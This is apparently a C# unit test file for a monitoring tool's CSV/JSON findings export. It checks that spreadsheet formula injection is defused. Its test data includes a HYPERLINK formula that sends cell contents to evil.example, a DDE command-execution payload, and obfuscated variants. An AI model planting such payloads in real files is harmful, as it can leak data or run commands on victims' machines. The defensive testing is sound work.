using System.Globalization;
using System.Text;
using System.Text.Json;
using EucLens.Core;
using Xunit;

namespace EucLens.Tests;

/// <summary>The optional findings export: formula-injection protection, RFC 4180 structure, the JSON schema, unavailable values, privacy and safe file output.</summary>
public sealed class FindingsExportTests
{
    private const string SecretDirectory = @"C:\Users\secret-admin\EucLens\Recordings";

    // ---------- a small RFC 4180 reader: what a spreadsheet's CSV import would see ----------

    internal static List<List<string>> Parse(string csv)
    {
        var rows = new List<List<string>>(); var row = new List<string>(); var field = new StringBuilder();
        var quoted = false; var i = 0; var wasQuoted = false;
        while (i < csv.Length)
        {
            var c = csv[i];
            if (quoted)
            {
                if (c == '"' && i + 1 < csv.Length && csv[i + 1] == '"') { field.Append('"'); i += 2; continue; }
                if (c == '"') { quoted = false; i++; continue; }
                field.Append(c); i++; continue;
            }
            if (c == '"' && field.Length == 0 && !wasQuoted) { quoted = true; wasQuoted = true; i++; continue; }
            if (c == ',') { row.Add(field.ToString()); field.Clear(); wasQuoted = false; i++; continue; }
            if (c == '\r' && i + 1 < csv.Length && csv[i + 1] == '\n') { row.Add(field.ToString()); field.Clear(); rows.Add(row); row = []; wasQuoted = false; i += 2; continue; }
            field.Append(c); i++;
        }
        if (field.Length > 0 || row.Count > 0) { row.Add(field.ToString()); rows.Add(row); }
        return rows;
    }

    private static string Roundtrip(string value) => Parse("a," + CsvField.Text(value) + "\r\n")[0][1];

    // ---------- formula injection ----------

    public static TheoryData<string> FormulaPayloads => new()
    {
        "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")", "=1+1", "+SUM(A1:A9)", "-1+2", "@SUM(1,1)", "=cmd|' /C calc'!A0",
        " =1+1", "\t=1+1", "\t\t  =1+1", "\r=1+1", "\n=1+1", "\r\n=1+1", "   +SUM(1)", " \t -2+3", "\u00A0=1+1", "\u200B=1+1", "\uFEFF=1+1", "\u2003@x",
        "＝1+1", "＋1", "－1", "＠SUM(1)", "\u0001=1+1"
    };

    [Theory]
    [MemberData(nameof(FormulaPayloads))]
    public void ATextFieldThatCouldBeAFormulaIsDefusedAndTheOriginalIsPreserved(string payload)
    {
        Assert.True(CsvField.NeedsFormulaGuard(payload));
        var cell = Roundtrip(payload);
        Assert.StartsWith("'", cell, StringComparison.Ordinal);                         // the apostrophe makes it text in a spreadsheet
        var expected = "'" + new string(payload.Select(c => char.IsControl(c) && c is not ('\t' or '\r' or '\n') ? ' ' : c).ToArray());   // otherwise exactly as recorded
        Assert.Equal(expected, cell);
    }

    [Theory]
    [InlineData("=1+1")] [InlineData("+1")] [InlineData("-1+2")] [InlineData("@SUM(1)")] [InlineData("  =1+1")] [InlineData("\t=1+1")]
    public void QuotingAloneWouldNotHaveProtectedTheFormulaAndTheGuardDoesNotDependOnIt(string payload)
    {
        // a CSV reader removes the quotes, so the cell would be the formula: only the apostrophe prevents that
        var field = CsvField.Text(payload);
        var cell = Parse(field)[0][0];
        Assert.False(cell.TrimStart(' ', '\t', '\r', '\n').StartsWith("=", StringComparison.Ordinal) && !cell.StartsWith("'", StringComparison.Ordinal));
        Assert.StartsWith("'", cell, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("plain text")] [InlineData("a=b")] [InlineData("1+1")] [InlineData("ms")] [InlineData("%")] [InlineData("Round-trip time")] [InlineData("x - y")] [InlineData("é ü 日本語")]
    [InlineData("'already text")] [InlineData("")]
    public void OrdinaryTextIsNotChanged(string text)
    {
        Assert.False(CsvField.NeedsFormulaGuard(text));
        Assert.Equal(text, Roundtrip(text));
    }

    [Fact]
    public void GeneratedNumbersAreNeverPrefixedSoANegativeNumberStaysANumber()
    {
        Assert.Equal("-5", CsvField.Number(-5.0)); Assert.Equal("0.1", CsvField.Number(0.1)); Assert.Equal("1E-06", CsvField.Number(1e-6).ToUpperInvariant());
        Assert.Equal("", CsvField.Number(double.NaN)); Assert.Equal("", CsvField.Number(double.PositiveInfinity)); Assert.Equal("", CsvField.Number((double?)null));
        Assert.Equal("-3", CsvField.Number(-3L));
    }

    // ---------- structure ----------

    [Theory]
    [InlineData("a,b")] [InlineData("say \"hi\"")] [InlineData("line1\r\nline2")] [InlineData("line1\nline2")] [InlineData("line1\rline2")] [InlineData(" leading")] [InlineData("trailing ")]
    [InlineData("\"")] [InlineData(",")] [InlineData("日本語, \"ü\"\r\nß")]
    public void StructuralCharactersRoundTripThroughRfc4180Quoting(string value)
    {
        Assert.Equal(value, Roundtrip(value));
    }

    [Fact]
    public void AFormulaWithStructuralCharactersIsBothGuardedAndQuotedAndRoundTrips()
    {
        var value = "=HYPERLINK(\"http://x\",\"a, b\")\r\nsecond line";
        var cell = Roundtrip(value);
        Assert.Equal("'" + value, cell);
    }

    [Fact]
    public void ControlCharactersBecomeSpacesAndLoneSurrogatesAreReplacedSoTheFileIsValidUtf8()
    {
        var cell = Roundtrip("a\u0000b\u0007c\ud800d\udc00e");
        Assert.Equal("a b c\uFFFDd\uFFFDe", cell);
        Assert.Equal("a\uFFFDb", CsvField.ToValidUtf16("a\ud800b"));
        Assert.Equal("😀", Roundtrip("😀"));                                             // a valid pair is kept
    }

    [Fact]
    public void ALongTextIsCutBelowTheSpreadsheetLimitAndSaysSo()
    {
        var cell = Roundtrip(new string('x', 100_000));
        Assert.Equal(CsvField.MaximumTextLength, cell.Length); Assert.EndsWith(CsvField.TruncationMarker, cell, StringComparison.Ordinal);
        var emoji = Roundtrip(string.Concat(Enumerable.Repeat("😀", 30_000)));
        Assert.True(emoji.Length <= CsvField.MaximumTextLength); Assert.DoesNotContain('\uFFFD', emoji);       // a surrogate pair is never split
        var guarded = Roundtrip("=" + new string('x', 100_000));
        Assert.StartsWith("'=", guarded, StringComparison.Ordinal); Assert.Equal(CsvField.MaximumTextLength, guarded.Length);
        Assert.Equal("", CsvField.Text(null)); Assert.Equal("", CsvField.Text(""));
    }

    // ---------- the export of real findings ----------

    private static (AnomalyAnalysis Analysis, HistoryInfo Info) Hostile(RecordingCompleteness state = RecordingCompleteness.Complete)
    {
        var s = new Synthetic(1200);
        s.Set("rtt", 300, 360, 200).Set("packetLoss", 310, 350, -0.0 + 3).Set("cpu", 800, 840, 97);
        s.Event(HistoryEventKind.AvailabilityChanged, 305, "=HYPERLINK(\"http://evil\")").Event(HistoryEventKind.SessionLocked, 315, "@SUM(1)");
        var input = s.ToInput();
        var hostile = new List<AnomalyChannel>();
        foreach (var c in input.Channels) hostile.Add(c.Id == "rtt" ? c with { Title = "=HYPERLINK(\"http://evil/\"&A1)" } : c);
        var withTitles = AnomalyInput.Create("rec \"1\", =x", Enumerable.Range(0, 1200).Select(n => Synthetic.T0.AddSeconds(n)).ToList(), hostile, input.Events, input.Protocols);
        var analysis = AnomalyDetectionEngine.Analyze(withTitles);
        var info = new HistoryInfo("abcd1234", Guid.Parse("11111111-2222-3333-4444-555555555555"), Synthetic.T0, Synthetic.T0.AddSeconds(1199), state == RecordingCompleteness.Complete, "Real", "0.4.4",
            ["Omnissa Horizon Blast", "Unknown protocol"], 1200, 0, 0, 0, 0, 1, state, "Stopped by the user", 0.998, 1, TimeSpan.FromSeconds(1.5), SecretDirectory, 0, state == RecordingCompleteness.Partial ? "limit" : "");
        return (analysis, info);
    }

    [Fact]
    public void EveryCsvRowHasTheColumnsOfTheHeaderAndTheHeaderIsFixed()
    {
        var (a, i) = Hostile();
        var rows = Parse(FindingsExport.Csv(a, i));
        Assert.Equal(FindingsExport.CsvColumns, rows[0]);
        Assert.Equal("schema,recording_id,engine_version,record_type,record_id,rule_or_pattern,rule_version,domain,severity,analysis_status,kind,start_utc,end_utc,duration_seconds,ending,recovered_at_utc,metric_id,metric,unit,minimum,p50,p95,maximum,worst_at_utc,valid_samples,matching_samples,coverage,threshold_basis,absolute_threshold,baseline_limit,baseline_median,baseline_sigma,baseline_samples,baseline_reliable,supporting_metrics,correlation_timing,common_overlap_start_utc,common_overlap_end_utc,component_ids,channels,reduced_confidence,recording_state,explanation,limitations",
            string.Join(',', rows[0]));
        Assert.Equal(1 + a.Observations.Count + a.Correlations.Count, rows.Count);
        Assert.All(rows, r => Assert.Equal(FindingsExport.CsvColumns.Count, r.Count));
        Assert.Equal(a.Observations.Count, rows.Count(r => r[3] == "observation")); Assert.Equal(a.Correlations.Count, rows.Count(r => r[3] == "correlation"));
    }

    [Fact]
    public void NoTextCellOfTheCsvCanBeReadAsAFormulaWhateverTheRecordingContained()
    {
        var (a, i) = Hostile();
        var rows = Parse(FindingsExport.Csv(a, i));
        var numeric = new HashSet<int>(new[] { "engine_version", "rule_version", "duration_seconds", "minimum", "p50", "p95", "maximum", "valid_samples", "matching_samples", "coverage", "absolute_threshold", "baseline_limit", "baseline_median", "baseline_sigma", "baseline_samples" }.Select(c => FindingsExport.CsvColumns.ToList().IndexOf(c)));
        foreach (var row in rows.Skip(1))
            for (var c = 0; c < row.Count; c++)
            {
                if (numeric.Contains(c)) { Assert.True(row[c] == "" || double.TryParse(row[c], NumberStyles.Float, CultureInfo.InvariantCulture, out _), $"column {FindingsExport.CsvColumns[c]}: '{row[c]}'"); continue; }
                Assert.False(CsvField.NeedsFormulaGuard(row[c]) && !row[c].StartsWith("'", StringComparison.Ordinal), $"column {FindingsExport.CsvColumns[c]} holds a live formula: '{row[c]}'");
            }
        var rtt = rows.First(r => r[3] == "observation" && r[16] == "rtt");
        Assert.Equal("'=HYPERLINK(\"http://evil/\"&A1)", rtt[17]);                    // the hostile counter title, defused and otherwise as recorded
        Assert.Equal("rec \"1\", =x", rtt[1]);                                          // an identifier with quotes and a comma round-trips
    }

    [Fact]
    public void TheCsvCarriesTheRealMeasurementsInTheirRecordedUnitAndTimesInUtc()
    {
        var (a, i) = Hostile();
        var rows = Parse(FindingsExport.Csv(a, i)); var col = FindingsExport.CsvColumns.ToList();
        var loss = rows.Single(r => r[3] == "observation" && r[5] == "conn.loss.sustained");
        var o = a.Observations.Single(x => x.RuleId == "conn.loss.sustained");
        Assert.Equal(FindingsExport.Schema, loss[col.IndexOf("schema")]);
        Assert.Equal(o.Id, loss[col.IndexOf("record_id")]); Assert.Equal("1", loss[col.IndexOf("rule_version")]);
        Assert.Equal("%", loss[col.IndexOf("unit")]); Assert.Equal(CsvField.Number(o.Primary.Maximum), loss[col.IndexOf("maximum")]);
        Assert.Equal(o.Start.UtcDateTime, DateTimeOffset.Parse(loss[col.IndexOf("start_utc")], CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal).UtcDateTime);
        Assert.EndsWith("Z", loss[col.IndexOf("start_utc")]); Assert.EndsWith("Z", loss[col.IndexOf("worst_at_utc")]);
        Assert.Equal("Absolute", loss[col.IndexOf("threshold_basis")]); Assert.Equal("1", loss[col.IndexOf("absolute_threshold")]);
        Assert.Equal(o.Explanation, loss[col.IndexOf("explanation")]);                // the engine's own words
        Assert.Equal("Complete", loss[col.IndexOf("recording_state")]); Assert.Equal("false", loss[col.IndexOf("reduced_confidence")]);
        var corr = rows.First(r => r[3] == "correlation");
        Assert.Equal("", corr[col.IndexOf("metric")]); Assert.Equal("", corr[col.IndexOf("maximum")]);   // nothing is invented for a row that has no measurement
        Assert.Equal("CommonOverlap", corr[col.IndexOf("correlation_timing")]); Assert.NotEqual("", corr[col.IndexOf("common_overlap_start_utc")]);
    }

    [Fact]
    public void AChainedCorrelationHasNoCommonOverlapInEitherFormat()
    {
        var s = new Synthetic(1200).Set("rtt", 100, 160, 200).Set("packetLoss", 150, 260, 3).Set("rtt", 240, 300, 200);
        var a = AnomalyDetectionEngine.Analyze(s.ToInput());
        var chained = Assert.Single(a.Correlations, c => c.Timing == CorrelationTiming.Chained);
        var (_, info) = Hostile();
        var col = FindingsExport.CsvColumns.ToList();
        var row = Parse(FindingsExport.Csv(a, info)).Single(r => r[col.IndexOf("record_id")] == chained.Id);
        Assert.Equal("Chained", row[col.IndexOf("correlation_timing")]); Assert.Equal("", row[col.IndexOf("common_overlap_start_utc")]); Assert.Equal("", row[col.IndexOf("common_overlap_end_utc")]);
        Assert.Equal(chained.ComponentIds, row[col.IndexOf("component_ids")].Split("; "));
        using var json = JsonDocument.Parse(FindingsExport.Json(a, info));
        var c = json.RootElement.GetProperty("correlations").EnumerateArray().Single(x => x.GetProperty("id").GetString() == chained.Id);
        Assert.Equal(JsonValueKind.Null, c.GetProperty("commonOverlap").ValueKind); Assert.Equal("Chained", c.GetProperty("timing").GetString());
        Assert.Equal(2, c.GetProperty("links").GetArrayLength());
        Assert.Equal(chained.ComponentIds, c.GetProperty("componentIds").EnumerateArray().Select(x => x.GetString()!));
    }

    // ---------- JSON ----------

    [Fact]
    public void TheJsonIsVersionedStructuredAndKeepsEveryStringAsRecorded()
    {
        var (a, i) = Hostile();
        var text = FindingsExport.Json(a, i);
        using var doc = JsonDocument.Parse(text);
        var root = doc.RootElement;
        Assert.Equal("euclens.findings/1", root.GetProperty("schema").GetString());
        foreach (var name in new[] { "recording", "analysis", "observations", "correlations", "coverage", "ruleEvaluations", "limitations" }) Assert.True(root.TryGetProperty(name, out _), name);
        var rec = root.GetProperty("recording");
        Assert.Equal("abcd1234", rec.GetProperty("shortId").GetString()); Assert.Equal("11111111-2222-3333-4444-555555555555", rec.GetProperty("recordingId").GetString());
        Assert.Equal("Omnissa Horizon Blast", rec.GetProperty("protocols")[0].GetString()); Assert.Equal("Unknown protocol", rec.GetProperty("protocols")[1].GetString());   // the recorded states, unmerged
        Assert.Equal(a.Observations.Count, root.GetProperty("observations").GetArrayLength()); Assert.Equal(a.Correlations.Count, root.GetProperty("correlations").GetArrayLength());
        var rtt = root.GetProperty("observations").EnumerateArray().First(x => x.GetProperty("metrics")[0].GetProperty("channelId").GetString() == "rtt");
        Assert.Equal("=HYPERLINK(\"http://evil/\"&A1)", rtt.GetProperty("metrics")[0].GetProperty("title").GetString());   // JSON keeps the original: formulas are a spreadsheet concern
        var o = a.Observations.First(x => x.Id == rtt.GetProperty("id").GetString());
        Assert.Equal(o.Explanation, rtt.GetProperty("explanation").GetString());
        Assert.Equal(o.Start.UtcDateTime, rtt.GetProperty("startUtc").GetDateTimeOffset().UtcDateTime); Assert.EndsWith("Z", rtt.GetProperty("startUtc").GetString());
        Assert.Equal(o.Primary.Maximum, rtt.GetProperty("metrics")[0].GetProperty("maximum").GetDouble());
        Assert.Equal(o.Primary.Unit, rtt.GetProperty("metrics")[0].GetProperty("unit").GetString());
        Assert.Contains(rtt.GetProperty("associatedEvents").EnumerateArray(), e => e.GetProperty("title").GetString() == "=HYPERLINK(\"http://evil\")" || e.GetProperty("title").GetString() == "@SUM(1)");
        Assert.Equal(a.Limitations.Count, root.GetProperty("limitations").GetArrayLength());
        Assert.Equal(text, FindingsExport.Json(a, i));                                      // deterministic
    }

    [Fact]
    public void UnavailableValuesAreNullWithExplicitAvailabilityNeverZeroOrNaN()
    {
        var (a, i) = Hostile();
        var broken = a with
        {
            Coverage = [new MetricCoverage("gpu", "GPU utilization", "", false, 100, 0, 0, double.NaN, null, null, "never recorded"),
                new MetricCoverage("rtt", "RTT", "ms", true, 100, 90, 0, double.PositiveInfinity, Synthetic.T0, Synthetic.T0.AddSeconds(5), null)],
            Observations = [a.Observations[0] with { Coverage = double.NaN, Metrics = [a.Observations[0].Primary with { ValidSamples = 0, Minimum = double.NaN, P50 = double.NaN, P95 = double.NaN, Maximum = double.NaN }] }]
        };
        var json = FindingsExport.Json(broken, i);
        Assert.DoesNotContain("NaN", json); Assert.DoesNotContain("Infinity", json);
        using var doc = JsonDocument.Parse(json);
        var gpu = doc.RootElement.GetProperty("coverage")[0];
        Assert.False(gpu.GetProperty("usable").GetBoolean()); Assert.Equal(JsonValueKind.Null, gpu.GetProperty("coverage").ValueKind); Assert.Equal(JsonValueKind.Null, gpu.GetProperty("firstValidUtc").ValueKind);
        Assert.Equal(JsonValueKind.Null, doc.RootElement.GetProperty("coverage")[1].GetProperty("coverage").ValueKind);
        var metric = doc.RootElement.GetProperty("observations")[0].GetProperty("metrics")[0];
        Assert.False(metric.GetProperty("available").GetBoolean()); Assert.Equal(JsonValueKind.Null, metric.GetProperty("minimum").ValueKind); Assert.Equal(JsonValueKind.Null, metric.GetProperty("worstAtUtc").ValueKind);
        var csv = FindingsExport.Csv(broken, i);
        Assert.DoesNotContain("NaN", csv); Assert.DoesNotContain("Infinity", csv);
        var col = FindingsExport.CsvColumns.ToList(); var row = Parse(csv)[1];
        Assert.Equal("", row[col.IndexOf("minimum")]); Assert.Equal("", row[col.IndexOf("maximum")]); Assert.Equal("", row[col.IndexOf("worst_at_utc")]); Assert.Equal("", row[col.IndexOf("coverage")]);
    }

    [Fact]
    public void AnUnreliableBaselineWritesNoBaselineStatistics()
    {
        var a = AnomalyDetectionEngine.Analyze(new Synthetic(100).Set("fps", 20, 70, 8).ToInput());
        var o = Assert.Single(a.Observations);
        Assert.False(o.Threshold.Baseline!.Reliable);
        var (_, info) = Hostile();
        using var doc = JsonDocument.Parse(FindingsExport.Json(a, info));
        var baseline = doc.RootElement.GetProperty("observations")[0].GetProperty("threshold").GetProperty("baseline");
        Assert.False(baseline.GetProperty("reliable").GetBoolean()); Assert.Equal(JsonValueKind.Null, baseline.GetProperty("median").ValueKind); Assert.False(string.IsNullOrEmpty(baseline.GetProperty("reason").GetString()));
        var col = FindingsExport.CsvColumns.ToList(); var row = Parse(FindingsExport.Csv(a, info))[1];
        Assert.Equal("", row[col.IndexOf("baseline_median")]); Assert.Equal("false", row[col.IndexOf("baseline_reliable")]);
    }

    [Theory]
    [InlineData(RecordingCompleteness.InProgress)] [InlineData(RecordingCompleteness.Partial)] [InlineData(RecordingCompleteness.Interrupted)]
    public void IncompleteRecordingsStayLabelledInBothFormats(RecordingCompleteness state)
    {
        var (a, i) = Hostile(state);
        var partial = a with { ReducedConfidence = true, Limitations = ["The recording is only partly analyzed."] };
        using var doc = JsonDocument.Parse(FindingsExport.Json(partial, i));
        Assert.Equal(state.ToString(), doc.RootElement.GetProperty("recording").GetProperty("state").GetString());
        Assert.Equal(state == RecordingCompleteness.Partial, doc.RootElement.GetProperty("recording").GetProperty("partial").GetBoolean());
        Assert.True(doc.RootElement.GetProperty("analysis").GetProperty("reducedConfidence").GetBoolean());
        Assert.Equal("The recording is only partly analyzed.", doc.RootElement.GetProperty("limitations")[0].GetString());
        var col = FindingsExport.CsvColumns.ToList();
        Assert.All(Parse(FindingsExport.Csv(partial, i)).Skip(1), r => { Assert.Equal(state.ToString(), r[col.IndexOf("recording_state")]); Assert.Equal("true", r[col.IndexOf("reduced_confidence")]); });
    }

    [Fact]
    public void TheExportsNameNeitherTheFolderNorTheMachine()
    {
        var (a, i) = Hostile();
        foreach (var text in new[] { FindingsExport.Csv(a, i), FindingsExport.Json(a, i) })
        {
            Assert.DoesNotContain("secret-admin", text); Assert.DoesNotContain(@"C:\Users", text); Assert.DoesNotContain(Environment.MachineName, text, StringComparison.OrdinalIgnoreCase);
        }
    }

    [Fact]
    public void LoneSurrogatesInRecordedStringsCannotBreakTheJsonExport()
    {
        var (a, i) = Hostile();
        var odd = a with { Limitations = ["bad \ud800 text", "ok 😀"] };
        using var doc = JsonDocument.Parse(FindingsExport.Json(odd, i with { EndReason = "x\udc00y" }));
        Assert.Equal("bad \uFFFD text", doc.RootElement.GetProperty("limitations")[0].GetString()); Assert.Equal("ok 😀", doc.RootElement.GetProperty("limitations")[1].GetString());
    }

    [Fact]
    public void TheExportsAreIdenticalAcrossRunsAndCultures()
    {
        var (a, i) = Hostile();
        var original = CultureInfo.CurrentCulture;
        try
        {
            CultureInfo.CurrentCulture = CultureInfo.InvariantCulture;
            var csv = FindingsExport.Csv(a, i); var json = FindingsExport.Json(a, i);
            foreach (var name in new[] { "de-DE", "pl-PL", "fr-FR", "ar-SA" })
            {
                CultureInfo.CurrentCulture = new CultureInfo(name);
                Assert.Equal(csv, FindingsExport.Csv(a, i)); Assert.Equal(json, FindingsExport.Json(a, i));
            }
        }
        finally { CultureInfo.CurrentCulture = original; }
    }

    // ---------- files ----------

    private static string TempDirectory()
    {
        var path = Path.Combine(Path.GetTempPath(), "euclens-findings-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(path);
        return path;
    }

    [Fact]
    public async Task TheFilesAreWrittenAtomicallyAsUtf8AndLeaveNoTemporaryFile()
    {
        var dir = TempDirectory();
        try
        {
            var (a, i) = Hostile();
            var csv = Path.Combine(dir, "f.csv"); var json = Path.Combine(dir, "f.json");
            await FindingsExport.WriteCsvAsync(csv, a, i); await FindingsExport.WriteJsonAsync(json, a, i);
            var csvBytes = await File.ReadAllBytesAsync(csv); var jsonBytes = await File.ReadAllBytesAsync(json);
            Assert.Equal([0xEF, 0xBB, 0xBF], csvBytes.Take(3));                              // a UTF-8 byte-order mark, so a spreadsheet reads the text as UTF-8
            Assert.Equal(FindingsExport.Csv(a, i), new UTF8Encoding(false, true).GetString(csvBytes.Skip(3).ToArray()));
            Assert.NotEqual(0xEF, jsonBytes[0]);
            Assert.Equal(FindingsExport.Json(a, i), new UTF8Encoding(false, true).GetString(jsonBytes));   // strict decoding: valid UTF-8
            Assert.Equal(["f.csv", "f.json"], Directory.GetFiles(dir).Select(Path.GetFileName).Order(StringComparer.Ordinal));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public async Task ACancelledOrFailedExportLeavesThePreviousFileAndNoTemporaryFile()
    {
        var dir = TempDirectory();
        try
        {
            var (a, i) = Hostile();
            var path = Path.Combine(dir, "f.json");
            await File.WriteAllTextAsync(path, "previous content");
            using var cts = new CancellationTokenSource(); cts.Cancel();
            await Assert.ThrowsAnyAsync<OperationCanceledException>(() => FindingsExport.WriteJsonAsync(path, a, i, cts.Token));
            Assert.Equal("previous content", await File.ReadAllTextAsync(path));
            await Assert.ThrowsAnyAsync<IOException>(() => FindingsExport.WriteCsvAsync(Path.Combine(dir, "missing-folder", "f.csv"), a, i));
            Assert.Equal(["f.json"], Directory.GetFiles(dir).Select(Path.GetFileName));
            await FindingsExport.WriteJsonAsync(path, a, i);                                  // success replaces it completely
            Assert.StartsWith("{", await File.ReadAllTextAsync(path));
            Assert.Equal(["f.json"], Directory.GetFiles(dir).Select(Path.GetFileName));
        }
        finally { Directory.Delete(dir, true); }
    }

    [Theory]
    [InlineData("EucLens-20261023-080000-abcd1234.meta.json")] [InlineData("EucLens-20261023-080000-abcd1234-part001.jsonl")] [InlineData("EucLens-20261023-080000-abcd1234-part002.jsonl.gz")]
    [InlineData("EucLens-20261023-080000-abcd1234.annotations.json")] [InlineData("EUCLENS-20261023-080000-ABCD1234.META.JSON")]
    public async Task AFindingsExportNeverOverwritesARecording(string name)
    {
        var dir = TempDirectory();
        try
        {
            var (a, i) = Hostile();
            var path = Path.Combine(dir, name);
            await File.WriteAllTextAsync(path, "recording content");
            await Assert.ThrowsAsync<IOException>(() => FindingsExport.WriteJsonAsync(path, a, i));
            await Assert.ThrowsAsync<IOException>(() => FindingsExport.WriteCsvAsync(path, a, i));
            Assert.Equal("recording content", await File.ReadAllTextAsync(path));
            Assert.Equal([name], Directory.GetFiles(dir).Select(Path.GetFileName));                // no temporary file, no second file
            var missing = Path.Combine(dir, "EucLens-20261023-080000-ffff0000.meta.json");           // not even a new file under a recording's name
            await Assert.ThrowsAsync<IOException>(() => FindingsExport.WriteJsonAsync(missing, a, i)); Assert.False(File.Exists(missing));
        }
        finally { Directory.Delete(dir, true); }
    }

    // ---------- the timeline export keeps its schema and is now protected against hidden formulas too ----------

    [Fact]
    public async Task TheTimelineExportKeepsItsColumnsAndDefusesFormulasHiddenBehindWhitespace()
    {
        var rec = await HistoryFixture.RecordAsync(60, step: async (i, c) =>
        {
            if (i == 30) await c.MarkIncidentAsync();
            if (i == 35) c.Mark(RecordingMarkKind.Note, "  =HYPERLINK(\"x\")");
            if (i == 40) c.Mark(RecordingMarkKind.Note, "\n+1+1");
            if (i == 45) c.Mark(RecordingMarkKind.Note, "plain, with comma");
        }, compress: false);
        var history = HistoryFixture.Load(rec.Storage, rec.ShortId);
        var rows = Parse(HistoryExport.TimelineCsv(history, null, TimeZoneInfo.Utc));
        Assert.Equal(HistoryExport.Header, string.Join(',', rows[0]));
        var details = rows.Skip(1).Select(r => r[6]).ToArray();
        Assert.Contains("'  =HYPERLINK(\"x\")", details); Assert.Contains("'\n+1+1", details); Assert.Contains("plain, with comma", details);
    }
}
